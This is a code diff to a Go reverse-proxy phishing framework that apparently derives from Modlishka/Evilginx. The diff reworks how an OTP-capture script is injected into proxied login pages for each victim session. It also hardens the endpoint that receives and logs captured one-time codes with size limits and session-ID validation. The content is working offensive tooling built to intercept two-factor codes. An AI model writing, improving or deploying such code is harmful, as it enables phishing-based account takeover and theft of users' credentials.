@@ -61,6 +61,7 @@ const (
 // original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
 var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+var sessionIdRegexp = regexp.MustCompile(`^[a-fA-F0-9]{64}$`)
 
 type HttpProxy struct {
 	Server            *http.Server
@@ -1202,30 +1203,35 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
-						}
 
-						otpCfg := p.cfg.GetOtpCaptureConfig()
-						if otpCfg != nil && otpCfg.Enabled {
-							otpPath := otpCfg.EndpointPath
-							if otpPath == "" {
-								otpPath = "/_otp_capture"
-							}
-							dataAttr := otpCfg.DataAttr
-							if dataAttr == "" {
-								dataAttr = "data-otp-input"
-							}
-							fieldNamesJs := ""
-							for i, fn := range otpCfg.FieldNames {
-								if i > 0 {
-									fieldNamesJs += ","
+							otpCfg := p.cfg.GetOtpCaptureConfig()
+							if otpCfg != nil && otpCfg.Enabled {
+								otpPath := otpCfg.EndpointPath
+								if otpPath == "" {
+									otpPath = "/_otp_capture"
 								}
-								fieldNamesJs += "'" + strings.ReplaceAll(fn, "'", "\\'") + "'"
+								dataAttr := otpCfg.DataAttr
+								if dataAttr == "" {
+									dataAttr = "data-otp-input"
+								}
+								fieldNamesJs := ""
+								for i, fn := range otpCfg.FieldNames {
+									if i > 0 {
+										fieldNamesJs += ","
+									}
+									fieldNamesJs += "'" + strings.ReplaceAll(fn, "'", "\\'") + "'"
+								}
+								if s.Id != "" {
+									otpJs := strings.ReplaceAll(OTP_CAPTURE_JS, "{endpoint}", otpPath)
+									otpJs = strings.ReplaceAll(otpJs, "{session_id}", s.Id)
+									otpJs = strings.ReplaceAll(otpJs, "{data_attr}", dataAttr)
+									otpJs = strings.ReplaceAll(otpJs, "[{field_names}]", fieldNamesJs)
+									newBody := p.injectJavascriptIntoBody(body, otpJs, "")
+									if len(newBody) >= len(body) {
+										body = newBody
+									}
+								}
 							}
-							otpJs := strings.ReplaceAll(OTP_CAPTURE_JS, "{endpoint}", otpPath)
-							otpJs = strings.ReplaceAll(otpJs, "{session_id}", s.Id)
-							otpJs = strings.ReplaceAll(otpJs, "{data_attr}", dataAttr)
-							otpJs = strings.ReplaceAll(otpJs, "[{field_names}]", fieldNamesJs)
-							body = p.injectJavascriptIntoBody(body, otpJs, "")
 						}
 					}
 				}
@@ -2045,12 +2051,34 @@ type OtpCaptureRequest struct {
 }
 
 func (p *HttpProxy) handleOtpCapture(req *http.Request) (*http.Request, *http.Response) {
-	body, err := ioutil.ReadAll(req.Body)
+	const maxBodySize = 64 * 1024
+
+	if req.Method != http.MethodPost {
+		resp := goproxy.NewResponse(req, "application/json", 405, `{"status":"error","message":"method not allowed"}`)
+		return req, resp
+	}
+	ct := req.Header.Get("Content-Type")
+	if ct != "" && !strings.HasPrefix(strings.ToLower(strings.TrimSpace(ct)), "application/json") {
+		resp := goproxy.NewResponse(req, "application/json", 415, `{"status":"error","message":"content type must be application/json"}`)
+		return req, resp
+	}
+
+	lr := &io.LimitedReader{R: req.Body, N: maxBodySize + 1}
+	body, err := ioutil.ReadAll(lr)
 	if err != nil {
 		resp := goproxy.NewResponse(req, "application/json", 400, `{"status":"error","message":"bad request"}`)
 		return req, resp
 	}
+	if len(body) > maxBodySize {
+		resp := goproxy.NewResponse(req, "application/json", 413, `{"status":"error","message":"payload too large"}`)
+		return req, resp
+	}
 	req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+
+	if len(body) == 0 {
+		resp := goproxy.NewResponse(req, "application/json", 400, `{"status":"error","message":"empty body"}`)
+		return req, resp
+	}
 
 	var otpReq OtpCaptureRequest
 	if err := json.Unmarshal(body, &otpReq); err != nil {
@@ -2058,13 +2086,28 @@ func (p *HttpProxy) handleOtpCapture(req *http.Request) (*http.Request, *http.Re
 		return req, resp
 	}
 
+	otpReq.SessionId = strings.TrimSpace(otpReq.SessionId)
+	otpReq.OtpCode = strings.TrimSpace(otpReq.OtpCode)
+	otpReq.FieldName = strings.TrimSpace(otpReq.FieldName)
 	if otpReq.SessionId == "" || otpReq.OtpCode == "" {
 		resp := goproxy.NewResponse(req, "application/json", 400, `{"status":"error","message":"missing fields"}`)
 		return req, resp
 	}
+	if len(otpReq.OtpCode) > 32 {
+		resp := goproxy.NewResponse(req, "application/json", 400, `{"status":"error","message":"otp code too long"}`)
+		return req, resp
+	}
+	if len(otpReq.SessionId) > 128 {
+		resp := goproxy.NewResponse(req, "application/json", 400, `{"status":"error","message":"session id too long"}`)
+		return req, resp
+	}
+	if !sessionIdRegexp.MatchString(otpReq.SessionId) {
+		resp := goproxy.NewResponse(req, "application/json", 400, `{"status":"error","message":"invalid session id"}`)
+		return req, resp
+	}
 
 	s, ok := p.sessions[otpReq.SessionId]
-	if !ok {
+	if !ok || s == nil {
 		resp := goproxy.NewResponse(req, "application/json", 404, `{"status":"error","message":"session not found"}`)
 		return req, resp
 	}
@@ -2073,7 +2116,11 @@ func (p *HttpProxy) handleOtpCapture(req *http.Request) (*http.Request, *http.Re
 	if err := p.db.SetSessionOtpCodes(s.Id, s.OtpCodes, s.OtpFieldName); err != nil {
 		log.Error("database: %v", err)
 	}
-	log.Success("[%d] captured OTP code: '%s' (field: %s)", p.sids[s.Id], otpReq.OtpCode, otpReq.FieldName)
+	if _, ok := p.sids[s.Id]; ok {
+		log.Success("[%d] captured OTP code: '%s' (field: %s)", p.sids[s.Id], otpReq.OtpCode, otpReq.FieldName)
+	} else {
+		log.Info("captured OTP code for session %s: '%s' (field: %s)", s.Id, otpReq.OtpCode, otpReq.FieldName)
+	}
 
 	resp := goproxy.NewResponse(req, "application/json", 200, `{"status":"ok"}`)
 	return req, resp
